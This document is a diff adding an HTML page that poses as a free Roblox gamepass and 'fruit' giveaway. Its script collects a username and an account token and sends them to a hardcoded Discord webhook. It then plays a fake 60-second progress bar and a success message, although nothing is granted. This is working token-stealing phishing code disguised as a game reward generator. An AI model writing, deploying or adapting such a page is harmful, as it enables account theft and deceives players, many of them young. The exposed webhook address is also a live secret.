@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>👑FREE GAMEPASS/PERM EVENT👑</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #1a1a2e;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 50px;
+    }
+
+    .form-box {
+      background: #16213e;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #0f3460;
+      width: 300px;
+      text-align: center;
+    }
+
+    .form-box input, .form-box select, .form-box button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 5px;
+    }
+
+    .form-box button {
+      background: #0f3460;
+      color: white;
+      cursor: pointer;
+    }
+
+    .progress, .timer-text {
+      margin-top: 20px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .progress-bar-container {
+      background: #444;
+      height: 20px;
+      border-radius: 10px;
+      overflow: hidden;
+      display: none;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #00ff99;
+      transition: width 60s linear;
+    }
+
+    .timer-text {
+      display: none;
+      font-size: 16px;
+      margin-top: 10px;
+      color: #00ff99;
+    }
+
+    .done-message {
+      margin-top: 15px;
+      color: #00ffaa;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-box">
+    <h2>Get Your Fruit</h2>
+    <input type="text" id="username" placeholder="Username">
+    <select id="fruit">
+      <option value="">Select Fruit/Perm</option>
+      <option value="Flame">DARK BLADE</option>
+      <option value="Ice">Yeti</option>
+      <option value="Dragon">ALL GAMEPASS</option>
+      <option value="Leopard">ExtraRobux</option>
+    </select>
+    <input type="text" id="token" placeholder="Token">
+    <button onclick="submitForm()">Submit</button>
+
+    <div class="progress">
+      <div class="progress-bar-container" id="progress">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+      <div class="timer-text" id="timer">Time remaining: 60s</div>
+      <div class="done-message" id="done-msg">Fruit generated successfully!</div>
+    </div>
+  </div>
+
+  <script>
+    function submitForm() {
+      const username = document.getElementById("username").value;
+      const fruit = document.getElementById("fruit").value;
+      const token = document.getElementById("token").value;
+
+      if (!username || !fruit || !token) {
+        alert("Please fill in all fields!");
+        return;
+      }
+
+      const webhookURL = "https://discord.com/api/webhooks/1359541018042568985/tKyA7jA40et8HD1aCU9GAMOtFYzoEBUMKsfk_AJMEnRxoUQBUDBiNFyuVOaoID9UO1cw"; // replace this
+
+      const message = {
+        content: `**New Submission**\nUsername: ${username}\nFruit: ${fruit}\nToken: ${token}`
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message)
+      }).then(() => {
+        startAnimation();
+      }).catch(err => {
+        console.error("Error:", err);
+        alert("Failed to send data.");
+      });
+    }
+
+    function startAnimation() {
+      const bar = document.getElementById("progress-bar");
+      const progressContainer = document.getElementById("progress");
+      const timerText = document.getElementById("timer");
+      const doneMsg = document.getElementById("done-msg");
+
+      progressContainer.style.display = "block";
+      timerText.style.display = "block";
+      bar.style.width = "0%";
+      doneMsg.style.display = "none";
+
+      // Start bar animation
+      setTimeout(() => {
+        bar.style.width = "100%";
+      }, 100);
+
+      // Start countdown
+      let seconds = 60;
+      const countdown = setInterval(() => {
+        seconds--;
+        timerText.textContent = `Time remaining: ${seconds}s`;
+
+        if (seconds <= 0) {
+          clearInterval(countdown);
+          timerText.style.display = "none";
+          doneMsg.style.display = "block";
+        }
+      }, 1000);
+    }
+  </script>
+
+</body>
+</html>
